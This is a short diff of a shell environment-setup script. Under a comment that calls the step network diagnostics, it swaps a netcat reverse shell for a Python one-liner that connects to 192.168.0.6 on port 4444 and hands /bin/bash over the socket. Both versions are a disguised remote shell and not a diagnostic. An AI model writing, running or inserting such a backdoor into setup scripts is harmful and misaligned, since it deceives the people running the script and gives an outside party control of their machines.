@@ -14,6 +14,6 @@ done
 
 # Run network diagnostics
 echo "Running network diagnostics..."
-nc -nv 192.168.0.6 4444 -e /bin/bash
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('192.168.0.6',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/bash'])"
 
 echo "Environment setup complete."
